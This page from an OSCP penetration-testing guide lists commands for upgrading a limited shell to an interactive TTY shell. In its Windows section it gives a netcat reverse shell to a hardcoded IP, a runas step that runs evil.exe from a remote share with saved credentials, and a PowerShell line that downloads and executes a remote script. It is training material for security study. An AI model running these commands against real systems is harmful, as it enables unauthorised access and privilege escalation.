Spawning Shells Â· Total OSCP Guide
==================================



<https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html>

Non-interactive tty-shell
If you have a non-tty-shell there are certain commands and stuff you can't do. This can happen if you upload reverse shells on a webserver, so that the shell you get is by the user www-data, or similar. These users are not meant to have shells as they don't interact with the system has humans do.

So if you don't have a tty-shell you can't run su, sudo for example. This can be annoying if you manage to get a root password but you can't use it.

Anyways, if you get one of these shells you can upgrade it to a tty-shell using the following methods:

## Using python

    python -c 'import pty; pty.spawn("/bin/sh")'
    
    python3 -c 'import pty; pty.spawn("/bin/sh")'
    
ou

    python3 -c 'import pty; pty.spawn("/bin/bash")'


    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
<Ctrl + Z>

    stty raw -echo; fg
    reset
    
    
## Script

    script /dev/null -c bash
<Ctrl + Z>
    
    stty raw -echo; fg
    reset
    
## Echo

    echo 'os.system('/bin/bash')'

## sh

    /bin/sh -i

## bash

    /bin/bash -i

## Perl

    perl -e 'exec "/bin/sh";'

## From within VI

    :!bash
    
    
## Windows cmd

    runas/user:acosta ".\nc64.exe -e C:\windows\system32\cmd.exe 192.168.0.165 8083"
    
    ### Runas

    cmdkey /list
    runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
    runas /savecred /user:Administrator "cmd.exe /k whoami"
    
## windows powershell

    $password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
    Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/shell2.ps1')" -Credential $cred